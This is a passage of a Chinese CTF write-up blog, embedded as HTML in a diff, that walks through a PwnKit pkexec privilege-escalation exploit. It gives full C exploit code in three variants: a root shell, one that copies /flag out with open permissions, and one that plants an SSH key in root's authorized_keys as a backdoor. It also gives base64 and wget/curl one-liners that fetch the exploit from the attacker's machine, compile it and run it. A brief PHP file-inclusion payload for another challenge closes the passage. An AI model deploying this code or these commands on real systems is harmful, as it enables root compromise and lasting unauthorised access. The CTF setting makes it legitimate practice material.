setegid(0);\n&quot;</span><br><span class="line">    &quot;       FILE *in = fopen(\&quot;/flag\&quot;, \&quot;r\&quot;);\n&quot; // 避开 system()，直接用底层 API 读 flag</span><br><span class="line">    &quot;       if (!in) exit(1);\n&quot;</span><br><span class="line">    &quot;       FILE *out = fopen(\&quot;/tmp/flag_success.txt\&quot;, \&quot;w\&quot;);\n&quot; // 写出到 tmp 目录</span><br><span class="line">    &quot;       if (!out) exit(1);\n&quot;</span><br><span class="line">    &quot;       char buf[1024];\n&quot;</span><br><span class="line">    &quot;       size_t n;\n&quot;</span><br><span class="line">    &quot;       while ((n = fread(buf, 1, sizeof(buf), in)) &gt; 0) &#123;\n&quot;</span><br><span class="line">    &quot;       &#125;\n&quot;</span><br><span class="line">    &quot;       fclose(in); fclose(out);\n&quot;</span><br><span class="line">    &quot;       chmod(\&quot;/tmp/flag_success.txt\&quot;, 0777);\n&quot; // 赋予最高权限方便我们查看</span><br><span class="line">    &quot;       exit(0);\n&quot;</span><br><span class="line">    &quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">/* --- 【下半部分：这是&quot;投毒者&quot;，负责布置现场和引爆】 --- */</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    </span><br><span class="line">    // 1. 布置畸形目录，为越界读取做准备</span><br><span class="line">    system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">    </span><br><span class="line">    // 2. 写入恶意字符集转换配置</span><br><span class="line">    system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">    </span><br><span class="line">    // 3. 把上半部分的&quot;毒药配方&quot;写入成一个物理文件</span><br><span class="line">    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">    fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">    fclose(fp); </span><br><span class="line">    </span><br><span class="line">    // 4. 在现场临时调用 gcc，把毒药熬成真正的 .so 动态链接库</span><br><span class="line">    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">    </span><br><span class="line">    // 5. 构造剧毒的环境变量，准备毒杀 pkexec</span><br><span class="line">    char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">    </span><br><span class="line">    // 6. 终极引爆：不带参数(NULL)启动 pkexec，强迫它吃下环境变量里的毒药</span><br><span class="line">    execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是在蚁剑终端执行的操作，那我们这里必须要编码了再执行，因为在c语言中有着大量例如；等内容，容易误使终端认为命令结束，导致我们无法执行</p>
+<p><strong>第二步：在蚁剑终端里依次执行以下命令：</strong></p>
+<p>先进入目录并编译（注意咱们这次叫 <code>exp2.c</code>）：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">gcc exp2.c -o exp2</span><br></pre></td></tr></table></figure>
+
+<p>那么这里我们为什么要进入到tmp目录呢</p>
+<p>然后引爆：</p>
+<p>Bash</p>
+<p>.&#x2F;exp2</p>
+<p>最后查看：</p>
+<p>cat &#x2F;tmp&#x2F;flag_success.txt</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260330205128200.png" alt="image-20260330205128200"></p>
+<p>当然以上只是其中的一种情况，还有很多情况下：</p>
+<p>🅰️ 情况 A：弹回交互式 Root Shell（最爽的解法）</p>
+<p><strong>💡 判断方法（什么时候用它？）：</strong></p>
+<ol>
+<li>靶机<strong>出网</strong>（能连通你的 Kali 或 Yakit）。</li>
+<li>你已经有了一个相对稳定的通道（比如你已经通过 Yakit 弹了一个低权限的 Shell 回来）。</li>
+<li>你想要拿到一个带有 <code>#</code> 的最高权限控制台，方便自由地敲命令、找线索。</li>
+</ol>
+<p>当然这个方法就需要考虑tty了，下面的b和c是不需要考虑tty的，蚁剑是没有原生tty的，它是一个伪终端，也就是pty，它和原生tty的区别就是原生tty由系统内核直接管理，具有完整的终端口特性；</p>
+<p>而蚁剑的pty则是<strong>Web 层模拟</strong>，依赖目标语言（PHP&#x2F;ASP&#x2F;JSP）的执行能力，某些极端场景（如复杂信号、内核级操作）可能不如原生稳定，但<strong>日常命令、提权、运维足够用</strong>。</p>
+<p>那为什么使用方法a就需要我们具有tty环境呢？</p>
+<ul>
+<li><strong>原理解析：</strong> Payload A 的最后一句是 <code>execve(&quot;/bin/sh&quot;, ...)</code>。它的目的是在当前进程中“召唤”出一个一直运行的 Shell，等待你不断输入 <code>ls</code>、<code>whoami</code> 等命令。</li>
+<li><strong>翻车现场：</strong> 如果你在蚁剑（没有 TTY）里执行 Payload A，蚁剑底层的 PHP 会帮你执行程序，程序确实召唤出了 <code>/bin/sh</code> 并且变成了 Root 权限，但是！<strong>这个 Root Shell 找不到可以输出画面的屏幕，也找不到可以接收你打字的键盘。</strong> 结果就是：网页一直转圈圈卡死，或者程序瞬间崩溃退出，你什么都看不到。</li>
+</ul>
+<p><strong>💻 完整 Payload 代码（在本地保存为 <code>payload_A.c</code>）：</strong></p>
+<p>C</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/* ========== 弹头部分开始 ========== */</span><br><span class="line">char *shell =</span><br><span class="line">    &quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">    &quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">    &quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">    &quot;       setuid(0); setgid(0);\n&quot;</span><br><span class="line">    &quot;       seteuid(0); setegid(0);\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【需要修改的地方 1：修复环境变量】</span><br><span class="line">     * 正常情况下 Ubuntu/CentOS 不需要改。</span><br><span class="line">     * 但如果靶机是极其奇葩的精简系统（敲 ls 都提示找不到），</span><br><span class="line">     * 你需要把这里的 PATH 改成靶机真实的 PATH。</span><br><span class="line">     */</span><br><span class="line">    &quot;       char *envp[] = &#123;\&quot;PATH=/bin:/usr/bin:/sbin:/usr/sbin\&quot;, NULL&#125;;\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【需要修改的地方 2：启动什么 Shell？】</span><br><span class="line">     * 绝大多数 Linux 都有 /bin/sh，所以通常不用改。</span><br><span class="line">     * 如果确定靶机有 bash，可以改成 &quot;/bin/bash&quot;。</span><br><span class="line">     */</span><br><span class="line">    &quot;       char *args[] = &#123;\&quot;/bin/sh\&quot;, NULL&#125;;\n&quot;</span><br><span class="line">    &quot;       execve(\&quot;/bin/sh\&quot;, args, envp);\n&quot;</span><br><span class="line">    &quot;       exit(0);\n&quot;</span><br><span class="line">    &quot;&#125;&quot;;</span><br><span class="line">/* ========== 弹头部分结束 ========== */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* ========== 发射器部分（死代码，无需修改） ========== */</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">    system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">    fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">    char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">    execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>🅱️ 情况 B：盲读&#x2F;物理搬运 Flag（极其猥琐但有效）</p>
+<p><strong>💡 判断方法（什么时候用它？）：</strong></p>
+<ol>
+<li>靶机<strong>不出网</strong>（你弹不回 Shell）。</li>
+<li>你只拿到了蚁剑、冰蝎等 WebShell，<strong>没有真正的交互式终端</strong>（执行 <code>/bin/sh</code> 会卡死）。</li>
+<li>你明确知道 Flag 藏在哪里，只想偷出来。</li>
+</ol>
+<p><strong>💻 完整 Payload 代码（在本地保存为 <code>payload_B.c</code>）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/* ========== 弹头部分开始 ========== */</span><br><span class="line">char *shell =</span><br><span class="line">    &quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">    &quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">    &quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">    &quot;       setuid(0); setgid(0);\n&quot;</span><br><span class="line">    &quot;       seteuid(0); setegid(0);\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【需要修改的地方 1：你要偷的文件在哪？】</span><br><span class="line">     * 默认是 &quot;/flag&quot;。</span><br><span class="line">     * 如果题目提示 flag 在 /root/secret.txt，请改成 fopen(\&quot;/root/secret.txt\&quot;, \&quot;r\&quot;);</span><br><span class="line">     * 再次提醒：注意里面的双引号需要加斜杠转义（\&quot;）！</span><br><span class="line">     */</span><br><span class="line">    &quot;       FILE *in = fopen(\&quot;/flag\&quot;, \&quot;r\&quot;);\n&quot; </span><br><span class="line">    &quot;       if (!in) exit(1);\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【需要修改的地方 2：偷出来的文件放哪？】</span><br><span class="line">     * 默认写到 &quot;/tmp/flag_success.txt&quot;。</span><br><span class="line">     * 如果靶机出题人把 /tmp 目录封了，请改成 &quot;/dev/shm/flag_success.txt&quot;</span><br><span class="line">     */</span><br><span class="line">    &quot;       FILE *out = fopen(\&quot;/tmp/flag_success.txt\&quot;, \&quot;w\&quot;);\n&quot;</span><br><span class="line">    &quot;       if (!out) exit(1);\n&quot;</span><br><span class="line">    </span><br><span class="line">    &quot;       char buf[1024];\n&quot;</span><br><span class="line">    &quot;       size_t n;\n&quot;</span><br><span class="line">    &quot;       while ((n = fread(buf, 1, sizeof(buf), in)) &gt; 0) &#123;\n&quot;</span><br><span class="line">    &quot;           fwrite(buf, 1, n, out);\n&quot;</span><br><span class="line">    &quot;       &#125;\n&quot;</span><br><span class="line">    &quot;       fclose(in); fclose(out);\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【需要修改的地方 3：权限同步修改】</span><br><span class="line">     * 这里的路径，必须和上面&quot;修改的地方 2&quot;保持一模一样！</span><br><span class="line">     * chmod 0777 是为了让你等下用低权限 webshell 也能直接看到内容。</span><br><span class="line">     */</span><br><span class="line">    &quot;       chmod(\&quot;/tmp/flag_success.txt\&quot;, 0777);\n&quot;</span><br><span class="line">    &quot;       exit(0);\n&quot;</span><br><span class="line">    &quot;&#125;&quot;;</span><br><span class="line">/* ========== 弹头部分结束 ========== */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* ========== 发射器部分（死代码，无需修改） ========== */</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">    system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">    fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">    char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">    execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>🅲 情况 C：强写 SSH 公钥留后门（AWD&#x2F;靶场长久固权）</p>
+<p><strong>💡 判断方法（什么时候用它？）：</strong></p>
+<ol>
+<li>靶机对外开放了 <strong>22 端口 (SSH)</strong>。</li>
+<li>你想留个后门，以后随时随地敲命令 <code>ssh root@靶机IP</code> 就能直接连上去，不需要每次都走 WebShell 去触发漏洞。</li>
+</ol>
+<p><strong>💻 完整 Payload 代码（在本地保存为 <code>payload_C.c</code>）：</strong></p>
+<p>C</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/* ========== 弹头部分开始 ========== */</span><br><span class="line">char *shell =</span><br><span class="line">    &quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">    &quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">    &quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">    &quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">    &quot;       setuid(0); setgid(0);\n&quot;</span><br><span class="line">    &quot;       seteuid(0); setegid(0);\n&quot;</span><br><span class="line">    </span><br><span class="line">    &quot;       FILE *out = fopen(\&quot;/root/.ssh/authorized_keys\&quot;, \&quot;a+\&quot;);\n&quot;</span><br><span class="line">    &quot;       if (out) &#123;\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* * ⚠️【极其重要！需要修改的地方：填入你的 SSH 公钥】</span><br><span class="line">     * 把下面 ssh-rsa 后面的内容，换成你自己 Kali/Mac 上的 ~/.ssh/id_rsa.pub 的内容！</span><br><span class="line">     * 注意结尾要保留 \\n 换行符！</span><br><span class="line">     */</span><br><span class="line">    &quot;           fprintf(out, \&quot;ssh-rsa AAAAB3NzaC1...你的公钥写在这里...== hacker@kali\\n\&quot;);\n&quot;</span><br><span class="line">    </span><br><span class="line">    &quot;           fclose(out);\n&quot;</span><br><span class="line">    &quot;       &#125;\n&quot;</span><br><span class="line">    </span><br><span class="line">    /* SSH 规范极其严格，公钥文件权限必须是 600，绝不能改！ */</span><br><span class="line">    &quot;       chmod(\&quot;/root/.ssh/authorized_keys\&quot;, 0600);\n&quot;</span><br><span class="line">    &quot;       exit(0);\n&quot;</span><br><span class="line">    &quot;&#125;&quot;;</span><br><span class="line">/* ========== 弹头部分结束 ========== */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* ========== 发射器部分（死代码，无需修改） ========== */</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">    system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">    fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">    char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">    execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>🚀 终极执行步骤（无脑照做即可）</p>
+<p><strong>1. 选好弹头，压缩成 Base64</strong> 在你的个人电脑（Kali&#x2F;Mac）上，选好上面的 A、B 或 C，修改好里面的信息并保存（比如存为 <code>exp.c</code>）。 打开你的本地终端执行： <code>cat exp.c | base64 -w 0</code>  <em>(如果是 Mac 则用 <code>base64 -i exp.c</code>)</em> 把你得到的那一长串乱码复制下来。</p>
+<p><strong>2. 在靶机上“一键超度”</strong> 切回你的蚁剑 &#x2F; Yakit 终端，直接粘贴并执行下面这行绝杀命令（把 <code>[你的Base64]</code> 替换掉）。</p>
+<p><em>👉 默认用 <code>/tmp</code> 作为阵地的连招：</em></p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[你的Base64]&quot; | base64 -d &gt; /tmp/exp.c &amp;&amp; cd /tmp &amp;&amp; gcc exp.c -o exp &amp;&amp; ./exp</span><br></pre></td></tr></table></figure>
+
+<p><em>👉 ⚠️ 防翻车备用连招（如果遇到报错 Permission denied，说明 <code>/tmp</code> 目录不准执行程序，立刻换下面这个，去 <code>/dev/shm</code> 阵地操作）：</em></p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[你的Base64]&quot; | base64 -d &gt; /dev/shm/exp.c &amp;&amp; cd /dev/shm &amp;&amp; gcc exp.c -o exp &amp;&amp; ./exp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么如何使用呢？</p>
+<p>第一种就是我们题目里面演示的那样，在题目终端里面直接echo我们编码后的内容写入到我们的文件中</p>
+<p>第二种方法就是我们先把对应的payload保存为.c后缀文件，然后让靶机访问我们的电脑，那么这里就肯定需要靶机可以出网了</p>
+<p><strong>操作步骤：</strong></p>
+<ol>
+<li><p><strong>本机开启兵工厂：</strong> 在你的本机上，把 <code>exp.c</code> 放到一个空文件夹里。打开终端，在这个文件夹下启动一个极其轻量的 Python 网页服务器：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p><em>（此时，你的本机变成了一个下载站）</em></p>
+</li>
+<li><p><strong>靶机主动拉取：</strong> 切换到靶机的命令行终端。利用 Linux 系统几乎必带的 <code>wget</code> 或 <code>curl</code> 命令，把你的武器拉过去并直接编译：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://[你的本机IP]:8000/exp.c -O exp.c</span><br><span class="line"># 如果没有 wget，就用 curl： curl http://[你的本机IP]:8000/exp.c -o exp.c</span><br><span class="line"></span><br><span class="line">gcc exp.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>优点：</strong> 完美绕过命令行长度限制，适合传输极其庞大的漏洞利用代码或二进制后门。</p>
+<p>方法三：降维打击 —— 本地预编译（无 GCC 绕过法）</p>
+<p>CTF 比赛到了后期，很多出题人会非常恶心人，**直接把靶机上的 <code>gcc</code> 编译器给卸载了！**我们如何去判断gcc编译器是否存在呢？</p>
+<p>我们可以输入gcc –version或者gcc  -v来查看版本信息，或者我们可以输入command -v gcc，如果环境存在gcc那我们就可以看见一个文件路径，反之不存在那么我们就看不见文件路径</p>
+<p> 这时候，无论你用 <code>echo</code> 还是 <code>wget</code> 把 <code>.c</code> 源码传上去，靶机都无法编译，直接报 <code>gcc: command not found</code>。</p>
+<p><strong>操作步骤：</strong> 既然靶机不能造武器，那我们就在<strong>自己家里造好，直接把核弹运过去</strong>。</p>
+<ol>
+<li><p><strong>环境对齐：</strong> 确认靶机的系统架构（通常是 64 位的 x86_64 Linux）。打开你的 Kali 虚拟机（必须也是 Linux 架构）。</p>
+</li>
+<li><p><strong>拆解 Payload：</strong> 你不能再用那个 <code>main</code> 函数去调用 <code>gcc</code> 的自动化脚本了。你必须手动把那段读 flag 的 C 代码保存为 <code>pwnkit.c</code>，然后在你自己的 Kali 上手动编译它：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwnkit.c -o pwnkit.so -shared -fPIC</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>打包上传：</strong> 用战术一（WebShell上传）或战术二（<code>wget</code>），把你在 Kali 上编译好的 <code>pwnkit.so</code> 这个二进制文件，直接传到靶机的 <code>/tmp</code> 目录下。</p>
+</li>
+<li><p><strong>手动引爆：</strong> 在靶机的终端里，手动敲击原本属于 <code>main</code> 函数布置环境的命令：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir -p &#x27;GCONV_PATH=.&#x27;</span><br><span class="line">touch &#x27;GCONV_PATH=./pwnkit&#x27;</span><br><span class="line">chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;</span><br><span class="line">mkdir -p pwnkit</span><br><span class="line">echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules</span><br><span class="line"></span><br><span class="line"># 极其重要：把你刚才上传的 pwnkit.so 移到这个文件夹里</span><br><span class="line">mv /tmp/pwnkit.so /tmp/pwnkit/pwnkit.so</span><br><span class="line"></span><br><span class="line"># 注入环境变量并引爆</span><br><span class="line">env -i PATH=GCONV_PATH=. CHARSET=PWNKIT SHELL=pwnkit /usr/bin/pkexec</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>优点：</strong> 终极杀招，彻底摆脱对靶机编译环境的依赖，专治各种被“阉割”的服务器环境。</p>
+<p>光顾着讲了，这里来讲一下第二种方法，第二种方法其实就是要利用我们的payloadA的方法了，那我们这里就要想办法搞定tty的东西了</p>
+<p>第一种方法就是拿哥斯拉做</p>
+<h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>进入题目之后是一个飞机票，无法直接看到什么信息，然后使用dirsearch去扫描一下扫到了一个flag.php，我们访问一下发现没有任何东西；</p>
+<p>然后我们抓包就会看见提示</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406163015358.png" alt="image-20260406163015358"></p>
+<p>我们解码一下就得到了&#x2F;n0_0ne_f1nd_m3&#x2F;，我么拿去访问一下</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406163313399.png" alt="image-20260406163313399"></p>
+<p>这里我第一次做的时候踩雷了，其实这里很简单，先来讲file参数应该传什么吧</p>
+<p>这里既然是有·include了，不需要多说直接伪协议去读文件，这里还提示我们去读imposible.php了，那这里目标就是它了，但是需要·注意的是这里我们不能使用base64编码，因为题目很明确给我们ban了，那这里我们拿rot13编码就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=string.rot13/resource=imposible.php</span><br></pre></td></tr></table></figure>
+
+<p>然后再来讲text的传参，我这里第一次做的时候就是直接传的那一串字符，发现死活不行，后面才想起来这里file_get_contents()的第一个参数是文件路径，我直接传字符串肯定是不行的，这里需要拿data伪协议做一个绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome to the 504sys</span><br></pre></td></tr></table></figure>
+
+<p>所以我们把两个payload拼接在一起就得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20504sys&amp;file=php://filter/read=string.rot13/resource=imposible.php</span><br></pre></td></tr></table></figure>
+
+<p>然后打开网页源代码解码就得到flag了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406170303016.png" alt="image-20260406170303016"></p>
